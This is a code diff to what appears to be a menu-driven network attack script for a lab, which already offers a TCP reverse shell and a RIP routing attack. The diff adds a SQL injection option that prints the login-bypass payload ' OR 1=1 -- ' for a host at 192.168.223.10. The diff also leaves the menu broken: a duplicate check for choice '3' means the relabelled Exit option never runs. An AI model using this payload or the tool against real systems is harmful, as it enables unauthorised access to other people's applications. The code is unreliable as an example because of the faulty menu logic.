@@ -272,6 +272,13 @@ def RIP_attack(): #minute 18
     #t1.start()
     #t2.start()
 
+def sql_injection():
+    print("Go to 192.168.223.10")
+    print("Enter the following in the username field: ")
+    print("' OR 1=1 -- ' ")
+    print("Enter any password.")
+    time.sleep(5)
+    choose_exploit()
 
 def choose_recon():
     #clear the screen
@@ -376,13 +383,17 @@ def choose_exploit():
     print("Choose an exploit.")
     print("1. TCP Reverse Shell")
     print("2. RIP Attack on the LAN access to the Internet")
-    print("3. Exit")
+    print("3. SQL Injection")
+    print("4. Exit")
     print("----------------------------------------------")
     choice = input("Enter your choice: ")
     if choice == "1":
         tcp_reverse_shell()
     elif choice == "2":
         RIP_attack()
+    elif choice == "3":
+        sql_injection()
+        
     elif choice == "3":
         print("Back to main menu.")
         os.system("clear")
